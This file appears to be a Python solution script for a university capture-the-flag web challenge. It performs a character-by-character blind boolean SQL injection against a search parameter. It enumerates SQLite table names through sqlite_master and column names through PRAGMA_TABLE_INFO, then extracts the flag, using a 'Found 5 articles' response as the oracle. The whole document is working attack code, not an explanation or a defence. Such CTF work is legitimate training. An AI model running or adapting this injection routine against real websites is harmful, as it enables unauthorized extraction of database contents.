import requests, re

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23262/"
chars = "abcdefghijklmnopqrstuvwxyz\{\}_:ABCDEFGHIJKLMNOPQRSTUVWXYZ "

def get_table_name():
    query = "' UNION SELECT 1, '', '' FROM sqlite_master WHERE type='table' and tbl_name != 'blog_post' AND tbl_name != 'user' AND tbl_name NOT LIKE '%user%' AND SUBSTR(tbl_name, 1, {}) == '{}' -- "
    table_name = ""
    
    while True:
        done = True
        for char in chars:
            r = requests.get(link, params={"search": query.format(len(table_name)+1, table_name + char)})
            if "Found 5 articles" in r.text:
                table_name += char
                done = False
                break
        if done:
            return table_name
        
def get_column_name(table_name, existing_columns):
    existing_columns_str = "".join(["name != '{}' AND ".format(c) for c in existing_columns])
    query = "' UNION SELECT 1, '', '' FROM PRAGMA_TABLE_INFO('{}') WHERE {}SUBSTR(name, 1, {}) = '{}' -- "
    column_name = ""

    while True:
        done = True
        for char in chars:
            r = requests.get(link, params={"search": query.format(table_name, existing_columns_str, len(column_name)+1, column_name + char)})
            if "Found 5 articles" in r.text:
                column_name += char
                done = False
                break
        if done:
            return column_name
        
def get_column_names(table_name):
    existing_columns = []
    while True:
        new_column = get_column_name(table_name, existing_columns)
        if new_column == "":
            return existing_columns
        existing_columns.append(new_column)

def get_flag(table_name, columns):
    for column in columns:
        query = "' UNION SELECT 1, '', '' FROM {} WHERE SUBSTR({}, 1, {}) == '{}' -- "
        flag = ""
        while True:
            done = True
            for char in chars:
                r = requests.get(link, params={"search": query.format(table_name, column, len(flag)+1, flag + char)})
                if "Found 5 articles" in r.text:
                    flag += char
                    done = False
                    break
            if done:
                flag = re.findall("SSof\{[^}]*\}", flag)
                if len(flag) > 0:
                    return flag[0]
                break

table_name = get_table_name()
columns = get_column_names(table_name)
flag = get_flag(table_name, columns)
print(flag)